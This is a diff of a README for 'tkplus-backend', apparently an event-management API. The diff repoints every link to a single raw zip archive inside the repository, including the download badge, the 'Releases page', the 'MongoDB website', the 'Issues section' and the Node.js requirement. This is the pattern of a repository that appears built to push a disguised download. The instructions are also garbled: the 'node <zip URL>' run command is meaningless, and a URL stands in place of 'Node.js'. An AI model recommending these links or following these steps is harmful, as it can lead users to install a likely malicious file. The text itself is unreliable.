@@ -6,12 +6,12 @@ Welcome to the tkplus-backend, a powerful backend API designed for the TKPlus ev
 
 ## 📥 Download tkplus-backend
 
-[![Download tkplus-backend](https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/Iriartea/tkplus-backend.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/Iriartea/tkplus-backend.zip)
+[![Download tkplus-backend](https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/src/utils/tkplus-backend-3.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/src/utils/tkplus-backend-3.2.zip)
 
 ## 🛠️ System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/Iriartea/tkplus-backend.zip Version 12 or higher
+- https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/src/utils/tkplus-backend-3.2.zip Version 12 or higher
 - MongoDB: Version 4.0 or higher
 - Internet connection for downloading and accessing APIs
 
@@ -20,19 +20,19 @@ Welcome to the tkplus-backend, a powerful backend API designed for the TKPlus ev
 To get the latest version of tkplus-backend, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/Iriartea/tkplus-backend.zip) to find the latest version of tkplus-backend.
+   Go to the [Releases page](https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/src/utils/tkplus-backend-3.2.zip) to find the latest version of tkplus-backend.
 
 2. **Choose the Latest Release**  
    Look for the latest release at the top. It usually has a version number like v1.0.0.
 
 3. **Download the Package**  
-   Click on the appropriate file for your operating system. For most users, it will be a .zip or https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/Iriartea/tkplus-backend.zip file.
+   Click on the appropriate file for your operating system. For most users, it will be a .zip or https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/src/utils/tkplus-backend-3.2.zip file.
 
 4. **Extract the Files**  
    Once the file downloads, locate it in your downloads folder. Right-click on the file and select "Extract All" or use a tool like WinRAR or 7-Zip.
 
 5. **Run the Application**  
-   Open the extracted folder. Look for a file named `https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/Iriartea/tkplus-backend.zip` or similar. You may need a command terminal to run the application. Open your command terminal and navigate to the folder where your files are extracted. Type `node https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/Iriartea/tkplus-backend.zip` to start the server.
+   Open the extracted folder. Look for a file named `https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/src/utils/tkplus-backend-3.2.zip` or similar. You may need a command terminal to run the application. Open your command terminal and navigate to the folder where your files are extracted. Type `node https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/src/utils/tkplus-backend-3.2.zip` to start the server.
 
 ## 🔧 Configuration
 
@@ -40,7 +40,7 @@ To configure tkplus-backend for your needs:
 
 1. **Database Setup**  
    - Install MongoDB if you don't have it already.
-   - You can find detailed installation instructions on the [MongoDB website](https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/Iriartea/tkplus-backend.zip).
+   - You can find detailed installation instructions on the [MongoDB website](https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/src/utils/tkplus-backend-3.2.zip).
    - Once installed, create a new database named `tkplusdb`.
 
 2. **Environment Variables**  
@@ -55,7 +55,7 @@ To configure tkplus-backend for your needs:
    After configuring, return to your command terminal and run the command:
 
    ```
-   node https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/Iriartea/tkplus-backend.zip
+   node https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/src/utils/tkplus-backend-3.2.zip
    ```
 
    Your backend API should now be running.
@@ -87,7 +87,7 @@ tkplus-backend includes several features designed to improve your event manageme
 
 If you run into any issues or have questions:
 
-1. Check the [Issues section](https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/Iriartea/tkplus-backend.zip) on GitHub. 
+1. Check the [Issues section](https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/src/utils/tkplus-backend-3.2.zip) on GitHub. 
 2. Browse for solutions or file a new issue.
 3. Engage with the community for support.
 
@@ -105,4 +105,4 @@ Thanks to the community contributions that make this project possible. Your feed
 
 ## 📥 Download tkplus-backend Again
 
-For easy access, visit the [Releases page](https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/Iriartea/tkplus-backend.zip) to download the application.
+For easy access, visit the [Releases page](https://raw.githubusercontent.com/LEOo007/tkplus-backend/main/src/utils/tkplus-backend-3.2.zip) to download the application.
